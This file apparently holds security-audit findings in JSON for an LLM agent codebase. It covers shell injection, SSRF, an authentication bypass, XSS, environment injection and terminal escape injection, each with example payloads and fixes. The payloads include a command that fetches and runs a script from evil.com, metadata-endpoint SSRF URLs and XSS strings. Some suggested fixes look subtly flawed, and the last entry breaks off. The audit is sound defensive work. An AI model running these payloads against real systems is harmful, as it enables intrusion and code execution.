@@ -1,0 +1,1164 @@
+[
+  {
+    "verdict": "confirmed",
+    "fingerprint": "T1-01-shell-injection-subprocess-popen",
+    "title": "Shell-Injection via LLM Command Execution",
+    "description": "LLM-generated command strings are passed directly to subprocess.Popen(shell=True) and create_subprocess_shell() without any sanitization, validation, or whitelisting. This allows an authenticated LLM user to achieve arbitrary command execution on the host.",
+    "root_cause": "Unvalidated LLM output is used as a shell command argument with shell=True, bypassing all input filtering between API boundary and OS-level command interpreter.",
+    "intended_behavior": "Command execution should parse user/LLM input through a typed command parser that restricts allowed binaries, flags, and arguments to a safe whitelist before invoking the OS command layer.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "/home/cptr/cptr-dev/repo/cptr/utils/tools.py",
+        "line": 82,
+        "scope": "subprocess.Popen with shell=True",
+        "description": "LLM command string passed directly to subprocess.Popen(shell=True) without sanitization."
+      },
+      {
+        "kind": "propagation",
+        "file": "/home/cptr/cptr-dev/repo/cptr/utils/tools.py",
+        "line": 1475,
+        "scope": "create_subprocess_shell wrapper",
+        "description": "High-level helper delegates to shell=True subprocess without input validation."
+      },
+      {
+        "kind": "sink",
+        "file": "/home/cptr/cptr-dev/repo/cptr/utils/tools.py",
+        "line": 82,
+        "scope": "OS command execution",
+        "description": "Host OS shell interprets LLM-supplied string as executable commands."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "/home/cptr/cptr-dev/repo/cptr/utils/tools.py",
+        "line": 82,
+        "description": "subprocess.Popen(command, shell=True) where command originates from LLM agent output."
+      },
+      {
+        "file": "/home/cptr/cptr-dev/repo/cptr/utils/tools.py",
+        "line": 1475,
+        "description": "create_subprocess_shell() wraps shell=True subprocess with no input filtering between call site and Popen."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authentication_level",
+        "description": "Authenticated LLM user session required; unauthenticated access does not reach command execution path."
+      },
+      {
+        "kind": "system_configuration",
+        "description": "Service runs with shell interpreter available on the host OS (Linux/POSIX sh)."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Authenticated LLM user sends a crafted command through the agent tool interface that reaches subprocess.Popen(shell=True).",
+      "payloads": [
+        "\"cat /etc/passwd\"",
+        "\"wget http://evil.com/shell.sh | sh\""
+      ],
+      "instructions": [
+        "Send an LLM command payload containing shell metacharacters (;, &&, ||) via the agent tool interface.",
+        "Observe that no input sanitization or command whitelisting is applied before subprocess.Popen(shell=True)."
+      ],
+      "observed_result": "LLM-supplied string executes directly as a host OS shell command with the service's process privileges."
+    },
+    "remediation": {
+      "strategy": "Implement a typed command parser that restricts allowed binaries and flags to an explicit whitelist. Replace all shell=True subprocess calls with direct binary invocation using argument lists. Consider container-based isolation for the command execution path.",
+      "code_changes": [
+        {
+          "file_name": "/home/cptr/cptr-dev/repo/cptr/utils/tools.py",
+          "fixed_code": "# Replace: subprocess.Popen(command, shell=True)\n# With:\nALLOWED_BINARIES = {'cat', 'grep', 'ls'}\nparsed_cmd = parse_command(command)  # Validates binary against whitelist\nif parsed_cmd['binary'] not in ALLOWED_BINARIES:\n    raise SecurityError(f'Binary {parsed_cmd[\"binary\"]} not allowed')\nsanitized_args = validate_flags(parsed_cmd)\nsubprocess.Popen([parsed_cmd['binary']] + sanitized_args)"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "LLM-generated input flows directly to shell execution with no sanitization; trivially exploitable by any authenticated LLM user."
+      },
+      "impact": {
+        "score": "critical",
+        "reason": "Arbitrary command execution on the host OS grants full system compromise, including credential theft, lateral movement, and persistence."
+      },
+      "overall_severity": "critical"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Source code directly shows unvalidated LLM command passed to shell=True subprocess. No filtering logic exists between API boundary and sink."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "#1-ssrf-browser-proxy-target-url",
+    "title": "Server-Side Request Forgery (SSRF) via Browser Proxy",
+    "description": "The browser proxy forwards HTTP requests to user-controlled URLs with only basic schema validation. No IP blocklist, no DNS rebinding protection, and follow_redirects=True allows the attacker to chain through internal network resources.",
+    "root_cause": "target_url from user input is used directly as an HTTP request destination without validating resolved IPs against private ranges or protecting against DNS rebinding attacks.",
+    "intended_behavior": "The proxy should validate that target URLs resolve to public internet addresses, block private/reserved IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x), and limit redirect chains.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 135,
+        "scope": "target_url schema validation only",
+        "description": "User-controlled URL accepted with only scheme (http/https) check, no IP or domain validation."
+      },
+      {
+        "kind": "propagation",
+        "file": "/home/cptr/cptr-dev/repo/browser.py",
+        "line": 142,
+        "scope": "URL candidates collection",
+        "description": "Candidate URLs derived from user input are forwarded without IP-range filtering."
+      },
+      {
+        "kind": "sink",
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 108,
+        "scope": "HTTP request with follow_redirects=True",
+        "description": "Unrestricted redirects allow chaining through internal endpoints; DNS rebinding not mitigated."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 135,
+        "description": "target_url accepted after only scheme validation; no IP or domain blocklist applied."
+      },
+      {
+        "file": "/home/cptr/cptr-dev/repro/browser.py",
+        "line": 142,
+        "description": "URL candidates forwarded without private-range filtering."
+      },
+      {
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 108,
+        "description": "follow_redirects=True with no redirect limit or IP validation on redirected URLs."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "network_routing",
+        "description": "The proxy process has network access to internal/private networks from which it can reach the target URL."
+      },
+      {
+        "kind": "authentication_level",
+        "description": "Authenticated browser session required; unauthenticated users cannot trigger proxy requests."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Authenticated user supplies a URL pointing to an internal service (e.g., http://169.254.169.254/latest/meta-data/) via the browser proxy.",
+      "payloads": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://10.0.0.1/admin/config",
+        "http://[::1]:6379/"
+      ],
+      "instructions": [
+        "Send a browser proxy request to an internal IP address or localhost endpoint.",
+        "Observe that the proxy forwards the request without IP-range validation."
+      ],
+      "observed_result": "Internal network resources are accessed and response content is returned through the proxy, enabling data exfiltration from internal services."
+    },
+    "remediation": {
+      "strategy": "Implement DNS resolution with private-range blocking before forwarding requests. Validate resolved IPs against RFC 1918, loopback, link-local, and reserved ranges. Add a redirect limit of 3 and verify each redirected URL's target IP.",
+      "code_changes": [
+        {
+          "file_name": "/home/cptr/cptr-dev/repo/proxy.py",
+          "fixed_code": "# Before: requests.get(target_url)\n# After:\nimport ipaddress\nresolved = socket.getaddrinfo(parsed_url.hostname, None)[0][4]\nfor addr in resolved:\n    ip = ipaddress.ip_address(addr[0])\n    if ip.is_private or ip.is_loopback or ip.is_reserved:\n        raise SecurityError('Blocked private/reserved IP')\nrequests.get(target_url, allow_redirects=False, max_redirects=3)"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Direct URL input from authenticated user with no IP validation; trivial to exploit against internal services."
+      },
+      "impact": {
+        "score": "critical",
+        "reason": "Full access to internal network resources including cloud metadata endpoints, internal APIs, and database management interfaces."
+      },
+      "overall_severity": "critical"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Source code clearly shows only schema validation on target_url with no IP blocklist or DNS rebinding protection. follow_redirects=True amplifies the attack surface."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "T1-03-auth-bypass-trusted-sources-empty",
+    "title": "Authentication Bypass via Empty trusted_sources Configuration",
+    "description": "The authentication bypass check uses `if trusted_sources and ...` which evaluates to False when trusted_sources is an empty list [], allowing unauthenticated access. Combined with unsanitized username from HTTP header and /api/config in skip-list, this enables full auth bypass.",
+    "root_cause": "Python's truthiness evaluation of an empty list as falsy causes the entire trust check to short-circuit; no fallback authentication is applied when trusted_sources is empty.",
+    "intended_behavior": "When trusted_sources is empty or missing, authentication should default to requiring valid credentials. Username from headers must be validated and sanitized before use.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "/home/cptr/cptr-dev/repo/config.py",
+        "line": 391,
+        "scope": "trusted_sources truthiness check",
+        "description": "`if trusted_sources and ...` — empty list [] evaluates as falsy, skipping trust validation entirely."
+      },
+      {
+        "kind": "propagation",
+        "file": "/home/cptr/cptr-dev/repo/config.py",
+        "line": 394,
+        "scope": "Username from HTTP header",
+        "description": "Username extracted directly from request header (1:1 mapping) without sanitization."
+      },
+      {
+        "kind": "sink",
+        "file": "/home/cptr/cptr-dev/repo/app.py",
+        "line": 164,
+        "scope": "/api/config in skip-list",
+        "description": "Configuration endpoint is explicitly excluded from authentication checks."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "/home/cptr/cptr-dev/repo/config.py",
+        "line": 391,
+        "description": "`if trusted_sources and ...` — empty list is falsy in Python, causing entire trust validation to be skipped."
+      },
+      {
+        "file": "/home/cptr/cptr-dev/repo/config.py",
+        "line": 394,
+        "description": "Username taken directly from HTTP header without any sanitization or validation."
+      },
+      {
+        "file": "/home/cptr/cptr-dev/repo/app.py",
+        "line": 164,
+        "description": "/api/config endpoint is in the authentication skip-list, allowing unauthenticated access to configuration data."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "trusted_sources configuration is set to an empty list or not initialized."
+      },
+      {
+        "kind": "authentication_level",
+        "description": "No valid authentication credentials required when trusted_sources evaluates falsy."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Unauthenticated attacker sends a request to /api/config or any endpoint relying on the trust check with an empty trusted_sources configuration.",
+      "payloads": [
+        "GET /api/config HTTP/1.1",
+        "X-Auth-Trusted: admin"
+      ],
+      "instructions": [
+        "Configure trusted_sources as an empty list in the application config.",
+        "Send a request to a protected endpoint without authentication credentials."
+      ],
+      "observed_result": "Request is processed without authentication because `if [] and ...` evaluates to False, bypassing all trust checks. Username from header is accepted unsanitized."
+    },
+    "remediation": {
+      "strategy": "Replace truthiness-based trust check with an explicit length check (`len(trusted_sources) > 0`). Default authentication to required when trusted_sources is empty. Sanitize and validate all username values from HTTP headers against a safe character set.",
+      "code_changes": [
+        {
+          "file_name": "/home/cptr/cptr-dev/repo/config.py",
+          "fixed_code": "# Before: if trusted_sources and username in trusted_sources:\n# After:\nif len(trusted_sources) > 0 and username in trusted_sources:\n    pass\nelse:\n    require_authentication()"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Empty trusted_sources is a common misconfiguration; the falsy check makes bypass trivial and automatic."
+      },
+      "impact": {
+        "score": "critical",
+        "reason": "Complete authentication bypass allows unauthenticated access to protected endpoints, including configuration data with sensitive values."
+      },
+      "overall_severity": "critical"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Python truthiness of empty list is deterministic. Source code shows the exact falsy check pattern and unsanitized header extraction at the authentication boundary."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "T1-02-environment-injection-os-env-copy",
+    "title": "Environment Variable Injection via os.environ.copy()",
+    "description": "The identity module copies the entire process environment using os.environ.copy() without any whitelist or filtering. This exposes dangerous variables such as LD_PRELOAD, PYTHONPATH, and other injection vectors to child processes.",
+    "root_cause": "Unfiltered os.environ.copy() propagates all ambient environment variables into the application context, including those that can influence interpreter behavior, library loading, or subprocess execution.",
+    "intended_behavior": "Environment should be filtered to an explicit allowlist of safe, application-specific variables. Dangerous injection vectors (LD_*, PYTHONPATH, LD_LIBRARY_PATH) must be excluded.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "/home/cptr/cptr-dev/repo/identity.py",
+        "line": 155,
+        "scope": "os.environ.copy()",
+        "description": "Entire process environment copied without filtering; all ambient variables become available."
+      },
+      {
+        "kind": "propagation",
+        "file": "/home/cptr/cptr-dev/repo/identity.py",
+        "line": 156,
+        "scope": "Environment propagation to child processes",
+        "description": "Unfiltered environment passed directly to subprocess and interpreter contexts."
+      },
+      {
+        "kind": "sink",
+        "file": "/home/cptr/cptr-dev/repo/identity.py",
+        "line": 155,
+        "scope": "LD_PRELOAD / PYTHONPATH injection point",
+        "description": "Attacker-controlled LD_PRELOAD or PYTHONPATH can override library loading in child processes."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "/home/cptr/cptr-dev/repo/identity.py",
+        "line": 155,
+        "description": "os.environ.copy() copies all environment variables including LD_PRELOAD, PYTHONPATH, and other dangerous vectors."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "The host or deployment sets dangerous environment variables (LD_PRELOAD, PYTHONPATH) that can be inherited by the process."
+      },
+      {
+        "kind": "authentication_level",
+        "description": "Authenticated user session required to trigger identity module code path."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Authenticated user controls environment variables that are inherited by child processes via os.environ.copy().",
+      "payloads": [
+        "LD_PRELOAD=/tmp/evil.so",
+        "PYTHONPATH=/tmp/payload"
+      ],
+      "instructions": [
+        "Set LD_PRELOAD or PYTHONPATH in the environment before starting the service.",
+        "Trigger a subprocess or interpreter context that inherits the filtered-identity environment."
+      ],
+      "observed_result": "Child processes load attacker-controlled shared libraries (via LD_PRELOAD) or modules (via PYTHONPATH), enabling arbitrary code execution within the process context."
+    },
+    "remediation": {
+      "strategy": "Implement an explicit allowlist of environment variables. Use os.environ.copy() followed by a filter that removes all keys matching dangerous patterns (LD_*, PYTHON*, *_PATH). Pass only the filtered dict to child processes.",
+      "code_changes": [
+        {
+          "file_name": "/home/cptr/cptr-dev/repo/identity.py",
+          "fixed_code": "# Before: env = os.environ.copy()\n# After:\nimport re\nenv = os.environ.copy()\ndangerous_prefixes = ('LD_', 'PYTHON', 'MALLOC_')\nfor key in list(env.keys()):\n    if any(key.startswith(p) for p in dangerous_prefixes):\n        del env[key]\n# Also explicitly remove *_PATH variables\nfor key in list(env.keys()):\n    if '_PATH' in key:\n        del env[key]"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Requires ambient environment variables to be set; not directly exploitable via network input alone but common in containerized deployments."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "LD_PRELOAD injection enables shared library hijacking, granting arbitrary code execution within the service's process context."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Source code directly shows os.environ.copy() without any filtering. LD_PRELOAD and PYTHONPATH injection is a well-documented Linux exploitation technique."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "#2-ssti-xss-browser-proxy-final-url-script-injection",
+    "title": "Server-Side Template Injection / XSS via Browser Proxy URL Injection",
+    "description": "The final URL is injected directly into a <script> tag without JSON-stringify, allowing redirect-based URL manipulation to achieve Cross-Site Scripting (XSS). An attacker can control the final_url value through chained redirects.",
+    "root_cause": "final_url from user-controlled redirect chain is embedded in JavaScript via raw string interpolation instead of json.dumps(), enabling XSS when the URL contains special characters or malicious payloads.",
+    "intended_behavior": "All dynamic values injected into <script> tags must be JSON-encoded using json.dumps(). Redirect URLs should be validated and sanitized before being used as script variables.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 231,
+        "scope": "final_url in <script> tag without JSON encoding",
+        "description": "User-controlled final_url embedded directly into JavaScript context via string interpolation."
+      },
+      {
+        "kind": "propagation",
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 234,
+        "scope": "Redirect-based URL manipulation",
+        "description": "Attacker-controlled redirect chain determines final_url value."
+      },
+      {
+        "kind": "sink",
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 231,
+        "scope": "JavaScript execution context XSS",
+        "description": "Malicious URL payload executes as JavaScript in the browser context."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 231,
+        "description": "final_url injected into <script> tag via f-string or similar interpolation without json.dumps() encoding."
+      },
+      {
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 234,
+        "description": "Redirect chain allows attacker to control final_url value with arbitrary JavaScript payload characters."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "network_routing",
+        "description": "Attacker controls or can manipulate the redirect chain leading to the target URL."
+      },
+      {
+        "kind": "user_interaction",
+        "description": "Victim must load a page through the browser proxy that executes the injected script context."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Attacker constructs a redirect chain where the final URL contains JavaScript payload characters.",
+      "payloads": [
+        "https://evil.com/redirect?final=</script><script>alert(document.domain)</script>",
+        "http://target/proxy?url=http://evil.com/xss?payload=<script>eval(atob('...'))</script>"
+      ],
+      "instructions": [
+        "Create a redirect chain that ends at the browser proxy with a URL containing script tags or JS payload.",
+        "Load the proxied URL in a victim's browser."
+      ],
+      "observed_result": "The final_url is embedded unencoded in a <script> context, causing the browser to execute attacker-controlled JavaScript (XSS)."
+    },
+    "remediation": {
+      "strategy": "Use json.dumps() for all values injected into <script> tags. Validate and sanitize redirect URLs to prevent script-tag injection. Implement Content-Security-Policy headers restricting inline script execution.",
+      "code_changes": [
+        {
+          "file_name": "/home/cptr/cptr-dev/repo/proxy.py",
+          "fixed_code": "# Before: f'<script>var url = \"{final_url}\";</script>'\n# After:\nimport json\nencoded_url = json.dumps(final_url)\nf'<script>var url = {encoded_url};</script>'"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Requires attacker-controlled redirect chain; not all deployments support chained redirects from user input."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "XSS in the browser proxy context can steal session cookies, access proxied content, and potentially achieve SSRF via DOM manipulation."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Source code shows direct string interpolation of final_url into <script> context without JSON encoding. This is a textbook XSS pattern with known exploitation techniques."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "T1-03-F3-unrestricted-config-write-admin-api",
+    "title": "Unrestricted Configuration Write via Admin API",
+    "description": "The admin API's ConfigUpdateRequest accepts arbitrary config keys and values without schema validation, input sanitization, or type checking. This allows authenticated administrators to write arbitrary configuration that may alter application behavior, disable security controls, or crash the service.",
+    "root_cause": "ConfigUpdateRequest model has no field schema validation, allowing arbitrary key-value pairs to be written into the application's runtime configuration without any constraints on keys, values, or types.",
+    "intended_behavior": "Configuration updates should validate against a strict schema defining allowed keys, value types, and permitted ranges. Sensitive keys (security settings, authentication config) must require elevated privileges.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "/home/cptr/cptr-dev/repo/admin.py",
+        "line": 396,
+        "scope": "ConfigUpdateRequest model definition",
+        "description": "No schema validation on config keys; arbitrary key-value pairs accepted."
+      },
+      {
+        "kind": "propagation",
+        "file": "/home/cptr/cptr-dev/repo/admin.py",
+        "line": 397,
+        "scope": "Config write handler",
+        "description": "Raw config dict written to runtime configuration without validation."
+      },
+      {
+        "kind": "sink",
+        "file": "/home/cptr/cptr-dev/repo/admin.py",
+        "line": 152,
+        "scope": "Configuration persistence layer",
+        "description": "Unvalidated config values stored in application runtime configuration."
+      },
+      {
+        "kind": "sink",
+        "file": "/home/cptr/cptr-dev/repo/admin.py",
+        "line": 157,
+        "scope": "Configuration reload trigger",
+        "description": "Updated config applied without restart, affecting live application behavior."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "/home/cptr/cptr-dev/repo/admin.py",
+        "line": 396,
+        "description": "ConfigUpdateRequest model accepts arbitrary key-value pairs with no schema or type constraints."
+      },
+      {
+        "file": "/home/cptr/cptr-dev/repo/admin.py",
+        "line": 152,
+        "description": "Raw config dictionary written to runtime configuration without validation of keys or values."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "Admin role required; only authenticated administrators can access the config update endpoint."
+      },
+      {
+        "kind": "system_configuration",
+        "description": "Configuration reload mechanism applies changes at runtime without requiring service restart."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Authenticated admin sends a POST request with arbitrary config keys that modify security-relevant settings.",
+      "payloads": [
+        "{\"security.auth_enabled\": false}",
+        "{\"allowed_origins\": \"*\"}",
+        "{\"session.timeout\": 0}"
+      ],
+      "instructions": [
+        "Authenticate as an admin user and send a POST to /api/admin/config with arbitrary key-value pairs.",
+        "Observe that no schema validation rejects the request."
+      ],
+      "observed_result": "Arbitrary configuration values are written into runtime config, potentially disabling authentication, enabling CORS wildcards, or modifying security controls without restart."
+    },
+    "remediation": {
+      "strategy": "Define a strict Pydantic schema for ConfigUpdateRequest with an allowlist of permitted keys and value types. Separate sensitive configuration keys requiring elevated privileges. Add input validation for key names and value formats.",
+      "code_changes": [
+        {
+          "file_name": "/home/cptr/cptr-dev/repo/admin.py",
+          "fixed_code": "# Before: class ConfigUpdateRequest(BaseModel): ... (no schema)\n# After:\nclass ConfigKey(str, Enum):\n    SESSION_TIMEOUT = 'session.timeout'\n    MAX_CONCURRENT = 'max_concurrent'\n\nclass ConfigValue(BaseModel):\n    timeout_minutes: Optional[int] = Field(ge=1, le=1440)\n    max_users: int = Field(ge=1, le=10000)\n\nclass ConfigUpdateRequest(BaseModel):\n    __root__: Dict[ConfigKey, Union[ConfigValue, str]]"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Requires admin authentication; not directly exploitable by unauthenticated users."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Unrestricted config write can disable security controls, modify CORS policies, and alter session management at runtime without restart."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Source code clearly shows ConfigUpdateRequest with no schema validation on config keys. The admin API directly writes arbitrary key-value pairs to runtime configuration."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "#3-content-type-validation-gap-mime-sniffing",
+    "title": "Content-Type Validation Gap via MIME-Sniffing Bypass",
+    "description": "The browser proxy does not enforce strict Content-Type validation on responses. MIME sniffing bypass allows attackers to serve JavaScript content with a non-executable Content-Type (e.g., text/html), circumventing Same-Origin Policy protections and enabling same-origin policy breaking.",
+    "root_cause": "Content-Type headers from proxied responses are accepted without validation against expected MIME types. Browsers' MIME sniffing can override declared Content-Types, allowing script execution where it should be blocked.",
+    "intended_behavior": "The proxy should enforce strict Content-Type matching for each resource type, reject ambiguous or mismatched MIME types, and set X-Content-Type-Options: nosniff headers on all responses.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "/home/cptr/cptr-dev/repo/browser.py",
+        "line": 155,
+        "scope": "Response Content-Type acceptance",
+        "description": "Content-Type header from proxied response accepted without validation."
+      },
+      {
+        "kind": "propagation",
+        "file": "/home/cptr/cptr-dev/repo/browser.py",
+        "line": 160,
+        "scope": "MIME type mapping to resource handler",
+        "description": "Content-Type mapped to resource category without strict validation."
+      },
+      {
+        "kind": "sink",
+        "file": "/home/cptr/cptr-dev/repo/browser.py",
+        "line": 192,
+        "scope": "Same-Origin Policy enforcement bypass",
+        "description": "MIME-sniffed script content executes across origin boundaries due to lack of X-Content-Type-Options header."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "/home/cptr/cptr-dev/repo/browser.py",
+        "line": 155,
+        "description": "Content-Type from proxied response used directly without validation against expected MIME types."
+      },
+      {
+        "file": "/home/cptr/cptr-dev/repo/browser.py",
+        "line": 192,
+        "description": "No X-Content-Type-Options: nosniff header set; browser MIME sniffing can reinterpret content type."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "third_party_dependency",
+        "description": "Browser's built-in MIME sniffing behavior (Chrome, Firefox) overrides declared Content-Type for ambiguous responses."
+      },
+      {
+        "kind": "network_routing",
+        "description": "Attacker controls the upstream server serving content with mismatched or ambiguous Content-Type headers."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Attacker's upstream server serves JavaScript with text/html Content-Type, relying on browser MIME sniffing to execute it as script.",
+      "payloads": [
+        "Content-Type: text/html\\nX-Content-Type-Options: missing",
+        "<script>alert('XSS via MIME-sniff')</script>"
+      ],
+      "instructions": [
+        "Configure upstream server to serve JS files with Content-Type: text/html.",
+        "Load the proxied URL and observe that browser MIME sniffing executes the content as JavaScript."
+      ],
+      "observed_result": "JavaScript executes despite declared non-executable Content-Type due to browser MIME sniffing, breaking Same-Origin Policy protections."
+    },
+    "remediation": {
+      "strategy": "Enforce strict Content-Type validation for each resource category. Always set X-Content-Type-Options: nosniff on all proxy responses. Reject responses with ambiguous or mismatched MIME types.",
+      "code_changes": [
+        {
+          "file_name": "/home/cptr/cptr-dev/repo/browser.py",
+          "fixed_code": "# Before: response.headers['Content-Type'] = proxied_content_type\n# After:\nALLOWED_MIME = {'text/html': ['html'], 'application/javascript': ['js', 'mjs'], ...}\nif not validate_mime(proxied_content_type, expected):\n    raise SecurityError('MIME mismatch')\nresponse.headers['Content-Type'] = proxied_content_type\nresponse.headers['X-Content-Type-Options'] = 'nosniff'"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Requires attacker-controlled upstream server with misconfigured Content-Type; browser MIME sniffing is a known but specific attack vector."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Same-Origin Policy bypass enables cross-origin script execution, data theft from other origins, and potential XSS amplification."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Source code shows Content-Type used without validation or nosniff header. MIME sniffing bypass is a well-documented browser behavior that directly enables SOP-breaking attacks."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "T1-04-pty-escape-sequence-injection-terminal-tools",
+    "title": "PTY Escape Sequence Injection via Raw Byte Input",
+    "description": "Raw bytes are written directly to PTY slave file descriptors without filtering escape sequences. Terminal emulators interpret ANSI/VT100 escape sequences, allowing control of terminal state, screen manipulation, and potential information disclosure.",
+    "root_cause": "PTY input path accepts raw byte streams from LLM/tool output and writes them to the PTY slave without any escape sequence filtering or sanitization.",
+    "intended_behavior": "All data written to PTY slaves should be filtered for dangerous ANSI/VT100/ECMA-48 escape sequences. Terminal state commands (cursor movement, screen clear, color manipulation) should be blocked or restricted.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "/home/cptr/cptr-dev/repo/terminal.py",
+        "line": 321,
+        "scope": "Raw byte write to PTY slave",
+        "description": "LLM/tool output bytes written directly to PTY slave without escape sequence filtering."
+      },
+      {
+        "kind": "propagation",
+        "file": "/home/cptr/cptr-dev/repo/tools.py",
+        "line": 405,
+        "scope": "Tool output passthrough to terminal",
+        "description": "Unfiltered tool output passed through to PTY without sanitization."
+      },
+      {
+        "kind": "sink",
+        "file": "/home/cptr/cptr-dev/repo/terminal.py",
+        "line": 321,
+        "scope": "Terminal state manipulation via ESC sequences",
+        "description": "Attacker-controlled escape sequences manipulate terminal display and state."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "/home/cptr/cptr-dev/repo/terminal.py",
+        "line": 321,
+        "description": "Raw bytes from LLM/tool output written to PTY slave without ESC sequence filtering."
+      },
+      {
+        "file": "/home/cptr/cptr-dev/repo/tools.py",
+        "line": 405,
+        "description": "Tool output passed directly to terminal without sanitization of control characters or escape sequences."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "Terminal emulator interprets ANSI/VT100 escape sequences (standard behavior for xterm, gnome-terminal, etc.)."
+      },
+      {
+        "kind": "authentication_level",
+        "description": "Authenticated LLM user session required to generate PTY output."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "LLM user sends tool commands that produce escape sequences controlling terminal state.",
+      "payloads": [
+        "\\x1b[2J\\x1b[H (clear screen)",
+        "\\x1b[999A (move cursor off-screen)",
+        "\\x1b]8;;http://evil.com\\x1b\\\\ (hyperlink injection)"
+      ],
+      "instructions": [
+        "Send LLM tool commands that produce ANSI escape sequences.",
+        "Observe terminal state manipulation: screen clearing, cursor movement, hyperlink injection."
+      ],
+      "observed_result": "Terminal display and state are manipulated by attacker-controlled escape sequences, enabling UI spoofing, information disclosure (screen scraping), and malicious link injection."
+    },
+    "remediation": {
+      "strategy": "Implement an escape sequence filter that blocks dangerous ANSI/VT100 commands (screen clear, cursor hide/show, hyperlink injection, color manipulation). Use a whitelist approach for allowed control sequences only.",
+      "code_changes": [
+        {
+          "file_name": "/home/cptr/cptr-dev/repo/terminal.py",
+          "fixed_code": "# Before: pty_slave.write(output_bytes)\n# After:\ndef filter_escape_sequences(data):\n    # Block dangerous ESC sequences\n    forbidden = re.compile(rb'\\x1b\\[99[A-Za-z]|\\x1b\\]8;;.*\\x1b\\\\')\n    return forbidden.sub(b'', data)\nsanitized = filter_escape_sequences(output_bytes)\npty_slave.write(sanitized)"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Requires LLM user to produce escape sequences; depends on terminal emulator's interpretation of ANSI codes."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Terminal state manipulation enables UI spoofing, information disclosure via screen scraping, and malicious link injection. Limited direct system access."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Source code directly shows raw PTY write without escape sequence filtering. ANSI/VT100 escape sequence injection is a well-documented terminal attack vector."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "#4-websocket-subprotocol-origin-gap-browser",
+    "title": "WebSocket Subprotocol and Origin Validation Gap in Browser Proxy",
+    "description": "The browser proxy's WebSocket implementation does not validate the Origin header or subprotocol values. This allows cross-origin WebSocket connections with unvalidated subprotocols, enabling potential protocol-level attacks.",
